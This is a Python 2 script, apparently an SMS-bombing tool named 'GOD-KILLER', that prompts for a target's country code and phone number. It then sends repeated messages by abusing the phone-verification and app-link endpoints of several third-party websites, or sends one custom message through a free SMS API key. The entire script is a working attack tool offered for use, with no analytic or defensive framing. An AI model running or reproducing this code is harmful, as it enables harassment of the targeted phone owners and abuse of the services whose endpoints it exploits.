import os
import requests
import time
import sys

try:
    print '\n      #####  ####### ######        #    # ### #       #       ####### ######\n     #     # #     # #     #       #   #   #  #       #       #       #     #\n     #       #     # #     #       #  #    #  #       #       #       #     #\n     #  #### #     # #     # ##### ###     #  #       #       #####   ######\n     #     # #     # #     #       #  #    #  #       #       #       #   #\n     #     # #     # #     #       #   #   #  #       #       #       #    #\n      #####  ####### ######        #    # ### ####### ####### ####### #     #\n                     ==================================\n                    ||    FROM FD                      ||\n                    ||    it contain L0v3 0f N!NjaHz   ||\n                    ||    github.com/FDX100            ||\n                    ||    facebook NinjaHz             ||\n                    ||    DEMO VERSION                 ||\n                     =================================='
    country_code = raw_input('[+] enter country code >> ')
    phone_number = raw_input('[+] enter target phone number >> ')
    print '\n    (1) to start spamm atack\n    (2) to start send one msg with custom content\n     '
    choice = raw_input('[+] your choice >>')

    def sms_sender(phone_number, country_code):
        url = 'https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=TR'
        params = {'phone_number': '' + phone_number + '',
           'country_code': '' + country_code + '',
           'platform': 'web'
           }
        response = requests.post(url, json=params)
        rx = response.json()
        if 'limited' in rx:
            print 'one method is full'


    def sms_sender2(phone_number, country_code):
        url = 'https://www.evite.com/ajax/text-me-app-download-link'
        phone = country_code + phone_number
        params = {'phone_number': '' + country_code + phone_number + '','referrer': 'textme'}
        response = requests.post(url, json=params)


    def sms_sender3(phone_number, country_code):
        url = 'https://4zxw.app.link/Ua8ZcPeSzn?__branch_flow_type=tmta&__branch_flow_id=689122853173209901'
        phone = country_code + phone_number
        params = {'phone': '' + phone + ''}
        response = requests.post(url, data=params)


    def sms_sender4(phone_number, country_code, msg):
        url = 'https://textbelt.com/text'
        params = {'phone': '+' + country_code + phone_number + '',
           'message': '' + msg + '',
           'key': 'textbelt'
           }
        response = requests.post(url, json=params)
        if 'Only' in response.content:
            print '[!] sorry today you send message for this phone number ' + country_code + phone_number
        else:
            print '[+] your message has been send seccessfuly  '


    if choice == '1':
        counts = input('[+] how many msg to send >> ')
        count = int(counts) / 3
        no = 0
        for i in range(count):
            sms_sender(phone_number, country_code)
            no = no + 1
            print '\r[+] message has been sent >> ' + str(no),
            sys.stdout.flush()
            time.sleep(2)
            sms_sender2(phone_number, country_code)
            no = no + 1
            print '\r[+] message has been sent >> ' + str(no),
            sys.stdout.flush()
            time.sleep(2)
            sms_sender3(phone_number, country_code)
            no = no + 1
            print '\r[+] message has been sent >> ' + str(no),
            sys.stdout.flush()
            time.sleep(1)

    if choice == '2':
        msg = raw_input('[+] enter your custom msg to send and press enter >> ')
        sms_sender4(phone_number, country_code, msg)
    print '\n[+] sending messages has been finished'
except KeyboardInterrupt:
    print '\nGOD-KILLER is Closed !!'
    quit()
